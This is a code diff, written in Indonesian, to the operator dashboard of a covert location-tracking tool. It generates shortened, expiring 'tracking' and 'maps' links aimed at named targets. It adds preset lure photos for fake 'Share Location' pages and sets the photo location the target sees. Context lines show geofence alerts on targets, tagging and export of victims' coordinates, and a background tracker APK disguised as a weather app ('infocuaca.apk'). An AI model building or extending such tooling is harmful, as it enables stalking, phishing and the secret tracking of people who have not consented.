@@ -310,6 +310,16 @@ body{background:radial-gradient(1100px 520px at 85% -12%,rgba(56,189,248,.10),tr
 .koord-title{color:var(--gold);font-size:10px;letter-spacing:2px;margin-bottom:10px;text-transform:uppercase}
 .koord-title::before{content:'◈ ';margin-right:4px}
 .koord-hint{font-size:9px;color:var(--text-d);margin-bottom:8px;line-height:1.6}
+.photo-link-list{display:grid;gap:8px;margin:10px 0 12px}
+.photo-link-card{background:#070d17;border:1px solid var(--cyan-d);border-radius:4px;padding:10px}
+.photo-link-card .pl-title{color:var(--gold);font-size:10px;font-weight:bold;letter-spacing:1px;margin-bottom:7px}
+.photo-link-row{display:flex;gap:6px;align-items:stretch}
+.photo-link-row input{flex:1;min-width:0;background:var(--bg);border:1px solid var(--border2);color:var(--cyan);font-family:'Courier New',monospace;font-size:10px;padding:9px 10px;outline:none;border-radius:var(--radius);word-break:break-all}
+.photo-link-row button{background:transparent;border:1px solid var(--border2);color:var(--text-d);font-family:'Courier New',monospace;font-size:9px;font-weight:bold;padding:0 9px;cursor:pointer;border-radius:var(--radius);white-space:nowrap}
+.photo-link-row button:hover{border-color:var(--gold);color:var(--gold)}
+.photo-link-row button.use-photo{border-color:var(--gold-d);color:var(--gold)}
+.photo-link-row button.use-photo:hover{background:var(--green-d);border-color:var(--gold)}
+.photo-selected{font-size:10px;color:var(--green);padding:8px 10px;background:rgba(0,229,138,.06);border:1px solid rgba(0,229,138,.2);border-radius:var(--radius);margin-bottom:8px;line-height:1.5}
 @media (max-width: 899px) {
   body.compact-mode .term-body:has(#globeBox),
   body.compact-mode .term-body:has(#radarGlobal),
@@ -433,54 +443,72 @@ body{background:radial-gradient(1100px 520px at 85% -12%,rgba(56,189,248,.10),tr
 <div class="term-body"><div class="prompt">[Audio] Kontrol Suara</div><div style="font-size:10px;color:var(--text-d);margin-bottom:8px">› atur volume alert & beep:</div><div class="vol-wrap"><span class="vl">VOL</span><input type="range" id="volSlider" min="0" max="100" value="30" oninput="setVol(this.value)"><span class="vl" id="volLabel">30%</span></div></div>
 <div class="term-body"><div class="prompt">[Live] All Target Map</div><div class="map-box tall"><div id="mapMulti" class="map-inner"></div><div class="map-label" id="multiLabel">◈ MULTI-TARGET LIVE</div><div class="map-coords" id="mapMultiCount">0 target</div></div></div>
 <div class="term-body"><div class="prompt">[Alert] Geofence Monitor</div><div style="font-size:10px;color:var(--text-d);margin-bottom:10px">Set titik + radius — alert bunyi kalau target masuk zona.</div><div class="geo-row"><input id="geoLat" class="geo-inp" placeholder="Latitude" type="number" step="any"><input id="geoLng" class="geo-inp" placeholder="Longitude" type="number" step="any"><input id="geoRadius" class="geo-inp" placeholder="Radius (m)" type="number" value="500" style="max-width:90px"></div><div style="display:flex;gap:6px;margin-bottom:10px"><button class="term-btn outline" onclick="setGeofence()" style="margin:0">Set Geofence</button><button class="term-btn danger" onclick="clearGeofence()" style="margin:0;flex:0 0 auto;width:auto;padding:0 16px">Clear</button></div><div class="geo-status" id="geoStatus">Belum diset</div><div class="geo-alert" id="geoAlert"></div></div>
-<div class="term-body"><div class="prompt">[Generate] Tracking Link</div><div style="font-size:10px;color:var(--text-d);margin-bottom:8px">› input target name:</div><input id="targetName" class="term-input" placeholder="contoh: Rorax" oninput="typingSound()" autocomplete="off"><div style="font-size:10px;color:var(--text-d);margin:12px 0 8px">› base URL custom (opsional):</div><input id="baseUrlCustom" class="term-input" placeholder="cth: https://domain-lain.com" oninput="typingSound()" autocomplete="off" spellcheck="false"><div style="font-size:9px;color:var(--text-d);margin:-4px 0 8px;opacity:.7">kosongkan = pakai domain ini</div><div class="sched-row"><label>⏰ EXPIRED:</label><select id="linkExpiry"><option value="0">∞ Tidak expired</option><option value="15">15 menit</option><option value="60">1 jam</option><option value="360">6 jam</option><option value="1440" selected>24 jam</option><option value="10080">7 hari</option><option value="43200">30 hari</option></select></div><div class="sched-info" id="schedInfo">› Link akan expired otomatis setelah <b>24 jam</b>.</div>
-
-<div class="koord-box" id="koordBox">
-  <div class="koord-title">Lokasi Foto (untuk target lihat)</div>
-  <div class="koord-hint">
-    › Isi alamat lokasi di bawah ini — otomatis akan mencari koordinatnya.<br>
-    › Atau klik tombol "Pakai Lokasi Saya" untuk menggunakan lokasi Anda saat ini.
-  </div>
-  <input id="dashCariAlamat" class="term-input" placeholder="Ketik alamat lengkap... (contoh: Monas Jakarta)" style="margin-bottom:8px">
-  <button class="term-btn outline" onclick="dashCariKoordinat()" style="margin-bottom:8px">🔍 Cari Koordinat dari Alamat</button>
-  <div class="geo-row">
-    <input id="dashLat" class="geo-inp" type="number" step="any" placeholder="Latitude (otomatis)" readonly>
-    <input id="dashLng" class="geo-inp" type="number" step="any" placeholder="Longitude (otomatis)" readonly>
-  </div>
-  <input id="dashNamaLokasi" class="term-input" placeholder="Nama lokasi (opsional) — Pantai Kuta" style="margin-bottom:8px">
-  <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:8px">
-    <button class="term-btn outline" onclick="dashAmbilLokasiSaya()" style="margin:0;width:100%">Pakai Lokasi Saya</button>
-    <button class="term-btn danger" onclick="dashClearLokasi()" style="margin:0;width:100%">Clear</button>
-  </div>
-  <div id="dashLokasiStatus" class="geo-status" style="margin-bottom:0">Belum diset — target akan lihat lokasi default</div>
-</div>
-
-<div style="font-size:10px;color:var(--text-d);margin:2px 0 8px">› pilih jenis link (auto-shorten via is.gd):</div>
+<div class="term-body"><div class="prompt">[Generate] Link Generator</div>
+<div style="font-size:10px;color:var(--text-d);margin-bottom:8px">› buat link tracking atau link denah untuk target:</div>
+<div style="font-size:10px;color:var(--gold);background:rgba(0,229,138,.06);border:1px solid var(--gold-d);border-radius:var(--radius);padding:9px 10px;margin-bottom:12px;line-height:1.6">⏰ <b>Semua link generator berlaku selama 24 jam.</b> Setelah itu link dianggap kedaluwarsa.</div>
+<div style="font-size:10px;color:var(--text-d);margin-bottom:8px">› input target name:</div>
+<input id="targetName" class="term-input" placeholder="contoh: Rorax" oninput="typingSound()" autocomplete="off">
+<div style="font-size:10px;color:var(--text-d);margin:12px 0 8px">› base URL custom (opsional):</div>
+<input id="baseUrlCustom" class="term-input" placeholder="cth: https://domain-lain.com" oninput="typingSound()" autocomplete="off" spellcheck="false">
+<div style="font-size:9px;color:var(--text-d);margin:-4px 0 8px;opacity:.7">kosongkan = pakai domain ini</div>
+<div class="sched-row"><label>⏰ EXPIRED:</label><select id="linkExpiry" aria-label="Masa berlaku link generator"><option value="1440" selected>24 jam (tetap)</option></select></div>
+<div class="sched-info" id="schedInfo">› Link generator otomatis diberi masa berlaku <b>24 jam</b>.</div>
 
 <div style="padding:16px 0;border-top:1px solid var(--border);margin-top:12px">
   <div style="color:var(--cyan);font-size:11px;font-weight:bold;margin-bottom:12px;letter-spacing:2px;text-transform:uppercase">◈ Link Generator</div>
   <section style="margin-bottom:16px">
-    <div style="color:var(--gold);font-size:11px;margin-bottom:10px">Track Link</div>
+    <div style="color:var(--gold);font-size:11px;margin-bottom:10px">Track Link · 24 JAM</div>
     <button class="term-btn outline" onclick="genLink()">Generate Track Link</button>
     <div id="TRACKResult" style="display:none;margin-top:12px"><div id="TRACKLabel" style="font-size:10px;color:var(--text-d);margin-bottom:6px"></div><div class="link-url-box" id="TRACKUrl"></div><button class="term-btn outline" id="TRACKCopy" style="margin-top:10px">📋 Salin Link</button></div>
   </section>
   <section>
-    <div style="color:var(--gold);font-size:11px;margin-bottom:10px">Denah Maps Link</div>
+    <div style="color:var(--gold);font-size:11px;margin-bottom:10px">Denah Maps Link · 24 JAM</div>
     <button class="term-btn outline" onclick="genLinkMaps()">Generate Maps Link</button>
     <div id="MAPSResult" style="display:none;margin-top:12px"><div id="MAPSLabel" style="font-size:10px;color:var(--text-d);margin-bottom:6px"></div><div class="link-url-box" id="MAPSUrl"></div><button class="term-btn outline" id="MAPSCopy" style="margin-top:10px">📋 Salin Link</button></div>
   </section>
 </div>
 
+  <div class="koord-box" id="koordBox">
+    <div class="koord-title">Lokasi Foto untuk Dilihat Target</div>
+    <div class="koord-hint">
+      › Atur koordinat lokasi foto di sini — tepat di bawah Generate Maps Link dan di atas Share Location.<br>
+      › Isi alamat lokasi foto atau klik "Pakai Lokasi Saya" agar lokasi tersebut ikut tampil pada link foto.
+    </div>
+    <input id="dashCariAlamat" class="term-input" placeholder="Ketik alamat lengkap... (contoh: Monas Jakarta)" style="margin-bottom:8px">
+    <button class="term-btn outline" onclick="dashCariKoordinat()" style="margin-bottom:8px">🔍 Cari Koordinat dari Alamat</button>
+    <div class="geo-row">
+      <input id="dashLat" class="geo-inp" type="number" step="any" placeholder="Latitude (otomatis)" readonly>
+      <input id="dashLng" class="geo-inp" type="number" step="any" placeholder="Longitude (otomatis)" readonly>
+    </div>
+    <input id="dashNamaLokasi" class="term-input" placeholder="Nama lokasi (opsional) — Pantai Kuta" style="margin-bottom:8px">
+    <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:8px">
+      <button class="term-btn outline" onclick="dashAmbilLokasiSaya()" style="margin:0;width:100%">Pakai Lokasi Saya</button>
+      <button class="term-btn danger" onclick="dashClearLokasi()" style="margin:0;width:100%">Clear</button>
+    </div>
+    <div id="dashLokasiStatus" class="geo-status" style="margin-bottom:0">Belum diset — target akan lihat lokasi default</div>
+  </div>
 <div style="padding:16px 0;border-top:1px solid var(--border);margin-top:12px">
   <div style="color:var(--cyan);font-size:11px;font-weight:bold;margin-bottom:12px;letter-spacing:2px;text-transform:uppercase">◈ Share Location</div>
-  
+
   <div style="font-size:10px;color:var(--text-d);margin-bottom:8px;line-height:1.6">
-    › <b style="color:var(--gold)">Cara pakai:</b> Upload foto ke GitHub dulu, lalu copy URL jsDelivr-nya ke kolom di bawah.<br>
-    › Contoh: <span style="color:var(--cyan)">https://cdn.jsdelivr.net/gh/roraxbali/image-hosting@main/images.jpg</span>
+    › <b style="color:var(--gold)">Tidak perlu mencari link GitHub.</b> Pilih salah satu link foto siap pakai di bawah ini, lalu klik <b style="color:var(--gold)">Gunakan link ini</b> atau <b style="color:var(--gold)">Salin</b>.
   </div>
-  
-  <input id="inputFotoUrl" class="term-input" placeholder="Tempel URL foto dari GitHub/jsDelivr..." style="margin-bottom:8px">
-  
+
+  <div class="photo-link-list">
+    <div class="photo-link-card">
+      <div class="pl-title">Foto 1</div>
+      <div class="photo-link-row"><input id="photoPreset1" value="https://cdn.jsdelivr.net/gh/roraxbali/image-hosting@main/images.jpg" readonly onclick="this.select()"><button onclick="copyPhotoPreset('photoPreset1',this)">📋 SALIN</button><button class="use-photo" onclick="usePhotoPreset('photoPreset1')">✓ GUNAKAN</button></div>
+    </div>
+    <div class="photo-link-card">
+      <div class="pl-title">Foto 2</div>
+      <div class="photo-link-row"><input id="photoPreset2" value="https://cdn.jsdelivr.net/gh/roraxbali/image-hosting@main/malam.jpg" readonly onclick="this.select()"><button onclick="copyPhotoPreset('photoPreset2',this)">📋 SALIN</button><button class="use-photo" onclick="usePhotoPreset('photoPreset2')">✓ GUNAKAN</button></div>
+    </div>
+  </div>
+
+  <div id="photoSelected" class="photo-selected">✅ Foto 1 siap digunakan</div>
+  <div style="font-size:10px;color:var(--text-d);margin-bottom:8px">› atau tempel URL foto lain jika diperlukan:</div>
+  <input id="inputFotoUrl" class="term-input" value="https://cdn.jsdelivr.net/gh/roraxbali/image-hosting@main/images.jpg" placeholder="Tempel URL foto lain..." style="margin-bottom:8px">
+
   <section style="margin-bottom:16px">
     <div style="color:var(--gold);font-size:11px;margin-bottom:10px">Share Loc 1 (view.html)</div>
     <button class="term-btn outline" onclick="genShareLoc1()">Generate Share Loc 1</button>
@@ -490,8 +518,8 @@ body{background:radial-gradient(1100px 520px at 85% -12%,rgba(56,189,248,.10),tr
       <button class="term-btn outline" id="FOTOCopy" style="margin-top:10px">📋 Salin Link</button>
     </div>
   </section>
-  
-  <section>
+
+  <section style="margin-bottom:16px">
     <div style="color:var(--gold);font-size:11px;margin-bottom:10px">Share Loc 2 (Vercel)</div>
     <button class="term-btn outline" onclick="genShareLoc2()">Generate Share Loc 2</button>
     <div id="PROResult" style="display:none;margin-top:12px">
@@ -500,9 +528,10 @@ body{background:radial-gradient(1100px 520px at 85% -12%,rgba(56,189,248,.10),tr
       <button class="term-btn outline" id="PROCopy" style="margin-top:10px">📋 Salin Link</button>
     </div>
   </section>
-</div>
-</div>
 
+
+</div>
+</div>
 <div class="term-body"><div class="prompt">[Data] Target Location</div><div class="map-box" id="mapLinkBox"><div id="mapLink" class="map-inner"></div><div class="map-label" id="mapLinkLabel">◈ AWAITING TARGET</div><div class="map-coords" id="mapLinkCoords">--, --</div></div><div class="folder-bar" id="folderBar"><button class="folder-chip active" data-folder="all">◈ SEMUA</button><button class="folder-chip" data-folder="untagged">◦ UNTAGGED</button><button class="folder-chip" data-folder="VIP">★ VIP</button><button class="folder-chip" data-folder="Suspect">⚠ SUSPECT</button><button class="folder-chip" data-folder="Client">◆ CLIENT</button><button class="folder-chip" data-folder="Family">♥ FAMILY</button></div><div class="search-row"><input id="searchInput" placeholder="🔍 cari target..." oninput="filterData()"><select id="filterDate" onchange="filterData()"><option value="all">Semua</option><option value="today">Hari Ini</option><option value="7days">7 Hari</option><option value="30days">30 Hari</option></select></div><div style="font-size:10px;color:var(--text-d);margin-bottom:10px">Showing&nbsp;<b id="countShown" style="color:var(--cyan)">0</b>&nbsp;/&nbsp;<b id="countTotal">0</b></div><div id="dupWarnBox"></div><div id="hasil"><div class="empty">Waiting for data...</div></div><div style="display:flex;gap:8px;margin-top:12px;padding-top:12px;border-top:1px solid var(--border)"><button class="term-btn outline" onclick="exportCSV()" style="margin:0">CSV</button><button class="term-btn outline" onclick="exportJSON()" style="margin:0">JSON</button><button class="term-btn danger" onclick="clearAll()" style="margin:0">Clear</button></div></div>
 <div class="term-body"><div class="prompt">[Monitor] APK Location</div><div class="map-box"><div id="mapApk" class="map-inner"></div><div class="map-label">APK TRACKER</div><div class="map-coords" id="mapApkCoords">--, --</div></div><div class="term-info"><div><span class="k">USER</span><span class="v" id="apkUser">-</span></div><div><span class="k">LAT</span><span class="v" id="apkLat">-</span></div><div><span class="k">LNG</span><span class="v" id="apkLng">-</span></div><div><span class="k">AKURASI</span><span class="v" id="apkAkurasi">-</span></div><div><span class="k">DEVICE</span><span class="v" id="apkDevice">-</span></div><div><span class="k">LAST UPDATE</span><span class="v" id="apkTime">-</span></div></div><button class="term-btn outline" style="margin-top:14px" onclick="bukaMapsApk()">Buka Google Maps</button></div>
 <div class="term-body"><div class="prompt">[Tools] Install Tracker APK</div><div class="term-info"><div><span class="k">FUNCTION</span><span class="v">Lacak HP kamu</span></div><div><span class="k">INTERVAL</span><span class="v">5 menit auto</span></div><div><span class="k">MODE</span><span class="v">Background service</span></div></div><div class="apk-steps"><div>Download file</div><div>Install APK</div><div>Input ID</div><div>Tracking aktif</div></div><a href="https://github.com/roraxbali/official/raw/main/infocuaca.apk" target="_blank" style="text-decoration:none"><button class="term-btn" style="margin-top:6px">Download APK</button></a></div>
@@ -756,6 +785,49 @@ window.bukaMapsApk=()=>{const la=document.getElementById('apkLat').innerText,ln=
 let currentLink='';window.currentLink='';
 function linkBase(){let c='';try{c=(document.getElementById('baseUrlCustom').value||'').trim()}catch(e){}c=c.replace(/\/+$/,'');if(!c)return location.origin;if(!/^[a-z]+:\/\//i.test(c))c='https://'+c;return c}
 function saveBase(){try{localStorage.setItem('baseUrlCustom_'+user,(document.getElementById('baseUrlCustom').value||'').trim())}catch(e){}}
+
+// Dua URL foto resmi yang langsung bisa dipakai tanpa mencari-cari link GitHub.
+const PHOTO_PRESET_URLS={
+  photoPreset1:'https://cdn.jsdelivr.net/gh/roraxbali/image-hosting@main/images.jpg',
+  photoPreset2:'https://cdn.jsdelivr.net/gh/roraxbali/image-hosting@main/malam.jpg'
+};
+async function copyPlainText(text){
+  try{
+    if(navigator.clipboard&&window.isSecureContext){await navigator.clipboard.writeText(text);return true}
+  }catch(e){}
+  try{
+    const ta=document.createElement('textarea');ta.value=text;ta.style.position='fixed';ta.style.opacity='0';document.body.appendChild(ta);ta.focus();ta.select();const ok=document.execCommand('copy');ta.remove();return ok;
+  }catch(e){return false}
+}
+window.copyPhotoPreset=async function(id,button){
+  const text=PHOTO_PRESET_URLS[id]||document.getElementById(id)?.value||'';
+  if(!text)return;
+  const ok=await copyPlainText(text);
+  if(button){const old=button.innerText;button.innerText=ok?'✓ TERSALIN':'✗ GAGAL';setTimeout(()=>button.innerText=old,1800)}
+  if(ok){if(window.clipAdd)clipAdd(text,'FOTO-PRESET');if(window.addLog)addLog('Link foto disalin: '+id,'ok');if(window.beep)beep(1800,0.06)}
+};
+window.usePhotoPreset=function(id){
+  const text=PHOTO_PRESET_URLS[id]||document.getElementById(id)?.value||'';
+  const input=document.getElementById('inputFotoUrl');
+  if(!text||!input)return;
+  input.value=text;
+  const label=document.getElementById('photoSelected');
+  if(label)label.innerHTML='✅ '+((id==='photoPreset2')?'Foto 2':'Foto 1')+' siap digunakan';
+  input.focus();input.select();
+  if(window.addLog)addLog('Link foto dipilih: '+((id==='photoPreset2')?'Foto 2':'Foto 1'),'ok');
+  if(window.beep)beep(1800,0.06);
+};
+
+// Link generator selalu dibuat dengan masa berlaku 24 jam.
+function generatorExpiryMinutes(){
+  const el=document.getElementById('linkExpiry');
+  const mins=el?parseInt(el.value,10):1440;
+  return Number.isFinite(mins)&&mins>0?mins:1440;
+}
+function addGeneratorExpiry(url){
+  const mins=generatorExpiryMinutes();
+  return url+(url.indexOf('?')>=0?'&':'?')+'exp='+mins+'&expires='+String(Date.now()+mins*60000);
+}
 (function(){try{const s=localStorage.getItem('baseUrlCustom_'+user)||'';const el=document.getElementById('baseUrlCustom');if(el&&s)el.value=s}catch(e){}})();
 async function autoShorten(longUrl){
   try{
@@ -772,7 +844,7 @@ function showBothLinks(longUrl,shortUrl,type){
   const labelEl=document.getElementById((type==='DYNAMIC FOTO'?'PRO':type)+'Label');
   if(!resBox||!urlBox)return;
   resBox.style.display='block';
-  if(labelEl)labelEl.innerText='› target link ('+type+')'+(shortUrl?' — AUTO-SHORTENED':'');
+  if(labelEl)labelEl.innerText='› target link ('+type+')'+(shortUrl?' — AUTO-SHORTENED':'')+((type==='TRACK'||type==='MAPS')?' — EXPIRED 24 JAM':'');
   let html='';
   if(shortUrl){
     html+='<div class="dual-link-item short"><div class="dl-label">◈ SHORTLINK (is.gd)</div><div class="dl-url">'+shortUrl+'</div></div>';
@@ -1018,7 +1090,7 @@ window.genShareLoc2 = async function(){
 window.genLink=async function(){
   playKlik();saveBase();
   const t=document.getElementById('targetName').value.trim()||'target';
-  const longUrl=linkBase()+'/track.html?u='+encodeURIComponent(user)+'&t='+encodeURIComponent(t);
+  const longUrl=addGeneratorExpiry(linkBase()+'/track.html?u='+encodeURIComponent(user)+'&t='+encodeURIComponent(t));
   window.currentLink=longUrl;window.lastLongLink=longUrl;
   addLog('Link track: '+t);
   showLoading('TRACK');
@@ -1044,7 +1116,7 @@ window.genLink=async function(){
 window.genLinkMaps=async function(){
   playKlik();saveBase();
   const t=document.getElementById('targetName').value.trim()||'target';
-  const longUrl=linkBase()+'/maps.html?u='+encodeURIComponent(user)+'&t='+encodeURIComponent(t);
+  const longUrl=addGeneratorExpiry(linkBase()+'/maps.html?u='+encodeURIComponent(user)+'&t='+encodeURIComponent(t));
   window.currentLink=longUrl;window.lastLongLink=longUrl;
   addLog('Link maps: '+t);
   showLoading('MAPS');
